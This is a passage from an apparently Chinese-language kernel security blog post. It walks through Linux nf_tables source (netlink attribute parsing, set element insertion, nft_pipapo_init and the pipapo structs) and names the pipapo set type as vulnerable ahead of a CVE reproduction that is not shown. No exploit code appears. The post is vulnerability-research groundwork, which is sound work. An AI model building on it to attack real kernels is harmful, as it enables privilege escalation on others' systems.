class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * nla_data - head of payload</span></span><br><span class="line"><span class="comment"> * @nla: netlink attribute</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">nla_data</span><span class="params">(<span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">char</span> *) nla + NLA_HDRLEN;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * nla_len - length of payload</span></span><br><span class="line"><span class="comment"> * @nla: netlink attribute</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">nla_len</span><span class="params">(<span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> nla-&gt;nla_len - NLA_HDRLEN;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * nla_next - next netlink attribute in attribute stream</span></span><br><span class="line"><span class="comment"> * @nla: netlink attribute</span></span><br><span class="line"><span class="comment"> * @remaining: number of bytes remaining in attribute stream</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns the next netlink attribute in the attribute stream and</span></span><br><span class="line"><span class="comment"> * decrements remaining by the size of the current attribute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct nlattr *<span class="title">nla_next</span><span class="params">(<span class="keyword">const</span> struct nlattr *nla, <span class="keyword">int</span> *remaining)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> totlen = NLA_ALIGN(nla-&gt;nla_len);</span><br><span class="line"></span><br><span class="line">*remaining -= totlen;</span><br><span class="line"><span class="keyword">return</span> (struct nlattr *) ((<span class="keyword">char</span> *) nla + totlen);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * nla_ok - check if the netlink attribute fits into the remaining bytes</span></span><br><span class="line"><span class="comment"> * @nla: netlink attribute</span></span><br><span class="line"><span class="comment"> * @remaining: number of bytes remaining in attribute stream</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">nla_ok</span><span class="params">(<span class="keyword">const</span> struct nlattr *nla, <span class="keyword">int</span> remaining)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> remaining &gt;= (<span class="keyword">int</span>) <span class="keyword">sizeof</span>(*nla) &amp;&amp;</span><br><span class="line">       nla-&gt;nla_len &gt;= <span class="keyword">sizeof</span>(*nla) &amp;&amp;</span><br><span class="line">       nla-&gt;nla_len &lt;= remaining;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * nla_for_each_attr - iterate over a stream of attributes</span></span><br><span class="line"><span class="comment"> * @pos: loop counter, set to current attribute</span></span><br><span class="line"><span class="comment"> * @head: head of attribute stream</span></span><br><span class="line"><span class="comment"> * @len: length of attribute stream</span></span><br><span class="line"><span class="comment"> * @rem: initialized to len, holds bytes currently remaining in stream</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nla_for_each_attr(pos, head, len, rem) \</span></span><br><span class="line"><span class="meta">for (pos = head, rem = len; \</span></span><br><span class="line"><span class="meta">     nla_ok(pos, rem); \</span></span><br><span class="line"><span class="meta">     pos = nla_next(pos, &amp;(rem)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * nla_for_each_nested - iterate over nested attributes</span></span><br><span class="line"><span class="comment"> * @pos: loop counter, set to current attribute</span></span><br><span class="line"><span class="comment"> * @nla: attribute containing the nested attributes</span></span><br><span class="line"><span class="comment"> * @rem: initialized to len, holds bytes currently remaining in stream</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nla_for_each_nested(pos, nla, rem) \</span></span><br><span class="line"><span class="meta">nla_for_each_attr(pos, nla_data(nla), nla_len(nla), rem)</span></span><br></pre></td></tr></table></figure><p>所以这里根据这里的宏定义可以看到最终for循环语句是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(attr = (nla + NLA_HDRLEN), rem = (nla-&gt;nla_len - NLA_HDRLEN); (rem &gt;= <span class="number">4</span>) &amp;&amp; (attr-&gt;nla_len &gt;= <span class="number">4</span>) &amp;&amp; (attr-&gt;nla_len) &lt; rem); pos = nla_next(pos, &amp;(rem)))</span><br></pre></td></tr></table></figure><p>结合上下文可以得出这里<code>desc-&gt;field_count</code>是由<code>NFTA_LIST_ELEM</code>数量所决定的。并且这里的<code>field_len</code>也是有做相应限制的。</p><p>这里再一次回到上一篇文章提到的<code>nft_add_set_elem</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_add_set_elem</span><span class="params">(struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nlattr *attr, u32 nlmsg_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr_array</span>[<span class="title">NFT_SET_EXPR_MAX</span>] =</span> &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nla</span>[<span class="title">NFTA_SET_ELEM_MAX</span> + 1];</span></span><br><span class="line">u8 genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line">u32 flags = <span class="number">0</span>, size = <span class="number">0</span>, num_exprs = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext_tmpl</span> <span class="title">tmpl</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span>, *<span class="title">ext2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_elem</span> <span class="title">elem</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span> *<span class="title">binding</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_object</span> *<span class="title">obj</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_userdata</span> *<span class="title">udata</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_data_desc</span> <span class="title">desc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nft_registers</span> <span class="title">dreg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line">u64 timeout;</span><br><span class="line">u64 expiration;</span><br><span class="line"><span class="keyword">int</span> err, i;</span><br><span class="line">u8 ulen;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    elem.priv = nft_set_elem_init(<span class="built_in">set</span>, &amp;tmpl, elem.key.val.data,</span><br><span class="line">      elem.key_end.val.data, elem.data.val.data,</span><br><span class="line">      timeout, expiration, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(elem.priv)) &#123;</span><br><span class="line">err = PTR_ERR(elem.priv);</span><br><span class="line"><span class="keyword">goto</span> err_parse_data;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    err = nft_setelem_insert(ctx-&gt;net, <span class="built_in">set</span>, &amp;elem, &amp;ext2, flags);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="keyword">if</span> (err == -EEXIST) &#123;</span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_DATA) ^</span><br><span class="line">    nft_set_ext_exists(ext2, NFT_SET_EXT_DATA) ||</span><br><span class="line">    nft_set_ext_exists(ext, NFT_SET_EXT_OBJREF) ^</span><br><span class="line">    nft_set_ext_exists(ext2, NFT_SET_EXT_OBJREF))</span><br><span class="line"><span class="keyword">goto</span> err_element_clash;</span><br><span class="line"><span class="keyword">if</span> ((nft_set_ext_exists(ext, NFT_SET_EXT_DATA) &amp;&amp;</span><br><span class="line">     nft_set_ext_exists(ext2, NFT_SET_EXT_DATA) &amp;&amp;</span><br><span class="line">     <span class="built_in">memcmp</span>(nft_set_ext_data(ext),</span><br><span class="line">    nft_set_ext_data(ext2), <span class="built_in">set</span>-&gt;dlen) != <span class="number">0</span>) ||</span><br><span class="line">    (nft_set_ext_exists(ext, NFT_SET_EXT_OBJREF) &amp;&amp;</span><br><span class="line">     nft_set_ext_exists(ext2, NFT_SET_EXT_OBJREF) &amp;&amp;</span><br><span class="line">     *nft_set_ext_obj(ext) != *nft_set_ext_obj(ext2)))</span><br><span class="line"><span class="keyword">goto</span> err_element_clash;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!(nlmsg_flags &amp; NLM_F_EXCL))</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (err == -ENOTEMPTY) &#123;</span><br><span class="line"><span class="comment">/* ENOTEMPTY reports overlapping between this element</span></span><br><span class="line"><span class="comment"> * and an existing one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">err = -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">goto</span> err_element_clash;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到通过<code>nft_set_elem_init</code>函数申请的element其实给到的是<code>elem.priv</code>中的，最后调用<code>nft_setelem_insert</code>将其插入到set中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_setelem_insert</span><span class="params">(<span class="keyword">const</span> struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nft_set_elem *elem,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct nft_set_ext **ext, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; NFT_SET_ELEM_CATCHALL)</span><br><span class="line">ret = nft_setelem_catchall_insert(net, <span class="built_in">set</span>, elem, ext);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = <span class="built_in">set</span>-&gt;ops-&gt;insert(net, <span class="built_in">set</span>, elem, ext);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先判断是否设置了<code>NFT_SET_ELEM_CATCHALL</code>标志位，这个会在后面的CVE复现中详细解释，这里不会出现这一标志位所以最终会调用<code>set-&gt;ops-&gt;insert</code>函数。</p><h3 id="nft-pipapo-init"><a href="#nft-pipapo-init" class="headerlink" title="nft_pipapo_init"></a>nft_pipapo_init</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_type</span> <span class="title">nft_set_pipapo_type</span> =</span> &#123;</span><br><span class="line">.features= NFT_SET_INTERVAL | NFT_SET_MAP | NFT_SET_OBJECT |</span><br><span class="line">  NFT_SET_TIMEOUT,</span><br><span class="line">.ops= &#123;</span><br><span class="line">.lookup= nft_pipapo_lookup,</span><br><span class="line">.insert= nft_pipapo_insert,</span><br><span class="line">.activate= nft_pipapo_activate,</span><br><span class="line">.deactivate= nft_pipapo_deactivate,</span><br><span class="line">.flush= nft_pipapo_flush,</span><br><span class="line">.remove= nft_pipapo_remove,</span><br><span class="line">.walk= nft_pipapo_walk,</span><br><span class="line">.get= nft_pipapo_get,</span><br><span class="line">.privsize= nft_pipapo_privsize,</span><br><span class="line">.estimate= nft_pipapo_estimate,</span><br><span class="line">.init= nft_pipapo_init,</span><br><span class="line">.destroy= nft_pipapo_destroy,</span><br><span class="line">.gc_init= nft_pipapo_gc_init,</span><br><span class="line">.commit= nft_pipapo_commit,</span><br><span class="line">.<span class="built_in">abort</span>= nft_pipapo_abort,</span><br><span class="line">.elemsize= offsetof(struct nft_pipapo_elem, ext),</span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里具有漏洞的set类型为上述类型，并且可以看到的是在<code>nf_tables_newset</code>函数在完成对set成员的赋值操作之后就会调用<code>ops-&gt;init(set, &amp;desc, nla)</code>来进行初始化，所以这里关注他的init即<code>nft_pipapo_init</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_pipapo_init</span><span class="params">(<span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nft_set_desc *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo</span> *<span class="title">priv</span> =</span> nft_set_priv(<span class="built_in">set</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_match</span> *<span class="title">m</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_field</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> err, i, field_count;</span><br><span class="line"></span><br><span class="line">field_count = desc-&gt;field_count ? : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (field_count &gt; NFT_PIPAPO_MAX_FIELDS)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">m = kmalloc(<span class="keyword">sizeof</span>(*priv-&gt;match) + <span class="keyword">sizeof</span>(*f) * field_count,</span><br><span class="line">    GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!m)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">m-&gt;field_count = field_count;</span><br><span class="line">m-&gt;bsize_max = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">m-&gt;scratch = alloc_percpu(<span class="keyword">unsigned</span> <span class="keyword">long</span> *);</span><br><span class="line"><span class="keyword">if</span> (!m-&gt;scratch) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> out_scratch;</span><br><span class="line">&#125;</span><br><span class="line">for_each_possible_cpu(i)</span><br><span class="line">*per_cpu_ptr(m-&gt;scratch, i) = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NFT_PIPAPO_ALIGN</span></span><br><span class="line">m-&gt;scratch_aligned = alloc_percpu(<span class="keyword">unsigned</span> <span class="keyword">long</span> *);</span><br><span class="line"><span class="keyword">if</span> (!m-&gt;scratch_aligned) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> out_free;</span><br><span class="line">&#125;</span><br><span class="line">for_each_possible_cpu(i)</span><br><span class="line">*per_cpu_ptr(m-&gt;scratch_aligned, i) = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">rcu_head_init(&amp;m-&gt;rcu);</span><br><span class="line"></span><br><span class="line">nft_pipapo_for_each_field(f, i, m) &#123;</span><br><span class="line"><span class="keyword">int</span> len = desc-&gt;field_len[i] ? : <span class="built_in">set</span>-&gt;klen;</span><br><span class="line"></span><br><span class="line">f-&gt;bb = NFT_PIPAPO_GROUP_BITS_INIT;</span><br><span class="line">f-&gt;groups = len * NFT_PIPAPO_GROUPS_PER_BYTE(f);</span><br><span class="line"></span><br><span class="line">priv-&gt;width += round_up(len, <span class="keyword">sizeof</span>(u32));</span><br><span class="line"></span><br><span class="line">f-&gt;bsize = <span class="number">0</span>;</span><br><span class="line">f-&gt;rules = <span class="number">0</span>;</span><br><span class="line">NFT_PIPAPO_LT_ASSIGN(f, <span class="literal">NULL</span>);</span><br><span class="line">f-&gt;mt = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Create an initial clone of matching data for next insertion */</span></span><br><span class="line">priv-&gt;clone = pipapo_clone(m);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(priv-&gt;clone)) &#123;</span><br><span class="line">err = PTR_ERR(priv-&gt;clone);</span><br><span class="line"><span class="keyword">goto</span> out_free;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">priv-&gt;dirty = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">rcu_assign_pointer(priv-&gt;match, m);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_free:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NFT_PIPAPO_ALIGN</span></span><br><span class="line">free_percpu(m-&gt;scratch_aligned);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">free_percpu(m-&gt;scratch);</span><br><span class="line">out_scratch:</span><br><span class="line">kfree(m);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用<code>nft_set_priv</code>函数去除set的data段当作<code>nft_pipapo</code>结构体使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct nft_pipapo - Representation of a set</span></span><br><span class="line"><span class="comment"> * @match:Currently in-use matching data</span></span><br><span class="line"><span class="comment"> * @clone:Copy where pending insertions and deletions are kept</span></span><br><span class="line"><span class="comment"> * @width:Total bytes to be matched for one packet, including padding</span></span><br><span class="line"><span class="comment"> * @dirty:Working copy has pending insertions or deletions</span></span><br><span class="line"><span class="comment"> * @last_gc:Timestamp of last garbage collection run, jiffies</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_match</span> __<span class="title">rcu</span> *<span class="title">match</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_match</span> *<span class="title">clone</span>;</span></span><br><span class="line"><span class="keyword">int</span> width;</span><br><span class="line"><span class="keyword">bool</span> dirty;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> last_gc;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上述有关于该结构体成员的描述，较为重要以及见的较多的是clone成员，他用于暂时存放要被insert获得delete的element。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">nft_set_priv</span><span class="params">(<span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)<span class="built_in">set</span>-&gt;data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后为m创建内存，可以看到创建内存的大小由<code>nft_pipapo_match</code>结构体本身以及前面的<code>field_count</code>决定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct nft_pipapo_match - Data used for lookup and matching</span></span><br><span class="line"><span class="comment"> * @field_countAmount of fields in set</span></span><br><span class="line"><span class="comment"> * @scratch:Preallocated per-CPU maps for partial matching results</span></span><br><span class="line"><span class="comment"> * @scratch_aligned:Version of @scratch aligned to NFT_PIPAPO_ALIGN bytes</span></span><br><span class="line"><span class="comment"> * @bsize_max:Maximum lookup table bucket size of all fields, in longs</span></span><br><span class="line"><span class="comment"> * @rcuMatching data is swapped on commits</span></span><br><span class="line"><span class="comment"> * @f:Fields, with lookup and mapping tables</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_match</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> field_count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NFT_PIPAPO_ALIGN</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * __percpu *scratch_aligned;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * __percpu *scratch;</span><br><span class="line"><span class="keyword">size_t</span> bsize_max;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_field</span> <span class="title">f</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里简单看一下这个结构体，可以发现后面就是一个结构为<code>nft_pipapo_field</code>动态数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nft_pipapo_for_each_field(field, index, match)\</span></span><br><span class="line"><span class="meta">for ((field) = (match)-&gt;f, (index) = 0;\</span></span><br><span class="line"><span class="meta">     (index) <span class="meta-string">&lt; (match)-&gt;</span>field_count;\</span></span><br><span class="line"><span class="meta">     (index)++, (field)++)</span></span><br></pre></td></tr></table></figure><p>接着就是对该结构体也就是m的赋值初始化，较为重要的是后续会进入到上述循环中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct nft_pipapo_field - Lookup, mapping tables and related data for a field</span></span><br><span class="line"><span class="comment"> * @groups:Amount of bit groups</span></span><br><span class="line"><span class="comment"> * @rules:Number of inserted rules</span></span><br><span class="line"><span class="comment"> * @bsize:Size of each bucket in lookup table, in longs</span></span><br><span class="line"><span class="comment"> * @bb:Number of bits grouped together in lookup table buckets</span></span><br><span class="line"><span class="comment"> * @lt:Lookup table: &#x27;groups&#x27; rows of buckets</span></span><br><span class="line"><span class="comment"> * @lt_aligned:Version of @lt aligned to NFT_PIPAPO_ALIGN bytes</span></span><br><span class="line"><span class="comment"> * @mt:Mapping table: one bucket per rule</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_field</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> groups;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> rules;</span><br><span class="line"><span class="keyword">size_t</span> bsize;</span><br><span class="line"><span class="keyword">int</span> bb;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NFT_PIPAPO_ALIGN</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *lt_aligned;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span 